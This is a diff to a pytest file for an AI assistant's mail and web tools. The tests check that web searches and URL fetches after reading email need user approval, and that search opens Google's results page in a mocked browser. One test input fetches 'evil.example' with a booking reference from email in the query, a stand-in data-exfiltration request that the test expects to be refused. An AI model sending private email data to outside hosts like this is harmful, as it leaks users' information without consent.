@@ -247,21 +247,30 @@ async def test_a_reply_is_threaded_and_a_draft_is_not_sent(google, two, config):
 @pytest.mark.made_up_rule
 async def test_after_reading_mail_searches_and_addresses_need_a_card(google, two, config, monkeypatch):
     fe, _ = two
+    opened = []
+
+    class Browser:  # no real browser here: what the search would open is all that matters
+        async def call(self, name, args, timeout=90):
+            opened.append(args.get("url"))
+            raise RuntimeError("no browser here")
+
     approvals = FakeApprovals()  # declines everything
     ctx = ctx_for(fe, config, approvals)
+    ctx.browser = Browser()
     await call("email_search", {"query": "booking"}, ctx)
     searched = await web.web_search({"query": "FB-1234 Fictional Bistro"}, ctx)
     fetched = await web.fetch_url({"url": "https://evil.example/?q=FB-1234"}, ctx)
-    assert searched.error and fetched.error
+    assert searched.error and fetched.error and not opened  # declined: nothing went to Google
     assert [(a.title, a.fields) for a in approvals.asked] == [
-        ("Search the web for this?", [("Search", "FB-1234 Fictional Bistro", "text")]),
+        ("Search Google for this?", [("Search", "FB-1234 Fictional Bistro", "text")]),
     ]
     assert fetched.text.startswith("Not opened: https://evil.example/?q=FB-1234")  # made up: no card, refused
-    # The next task starts clean: no card (the search itself then fails here, offline, which is fine).
-    clean = ctx_for(fe, dataclasses.replace(config, search_url="http://127.0.0.1:9"), approvals)
-    with pytest.raises(httpx.HTTPError):
+    # The next task starts clean: no card, Google's results page opens.
+    clean = ctx_for(fe, config, approvals)
+    clean.browser = Browser()
+    with pytest.raises(RuntimeError):
         await web.web_search({"query": "weather"}, clean)
-    assert len(approvals.asked) == 1
+    assert len(approvals.asked) == 1 and opened == ["https://www.google.com/search?q=weather"]
 
 
 async def test_after_reading_mail_browser_navigation_needs_a_card_even_with_all_sites_allowed(two, config):
@@ -354,3 +363,27 @@ async def test_a_new_email_needs_a_subject(google, two, config):
         t for t in (lambda r: (mail.register(r), r)[1])(Registry()).specs() if t["function"]["name"] == "email_send"
     )
     assert "subject" in spec["function"]["parameters"]["required"]
+
+
+async def test_a_search_is_googles_own_page_read_in_the_browser(two, config):
+    """SPEC §3.4 "Web search": Google's results page, its answer box first, in the compact view; not a list of
+    links (seen: a drive time took three cards, then a typed search on google.com, to reach Google's answer)."""
+    import mcp.types as mt
+
+    fe, _ = two
+    page = (
+        "### Page\n- Page URL: https://www.google.com/search?q=drive+time\n### Snapshot\n```yaml\n"
+        '- heading "11 min (3.4 km)" [level=2] [ref=e5]\n- text: via Tufnell Park Rd\n'
+        '- link "Directions" [ref=e6] [cursor=pointer]:\n  - /url: https://www.google.com/maps/dir/a/b\n```'
+    )
+
+    class Browser:
+        async def call(self, name, args, timeout=90):
+            return mt.CallToolResult(content=[mt.TextContent(type="text", text=page)])
+
+    ctx = ctx_for(fe, config, FakeApprovals())
+    ctx.browser = Browser()
+    result = await web.web_search({"query": "drive time"}, ctx)
+    assert result.text.startswith("Google's results for “drive time”")
+    assert "## 11 min (3.4 km)" in result.text and "[Directions](e6)" in result.text
+    assert "google.com" in ctx.task.opened_sites
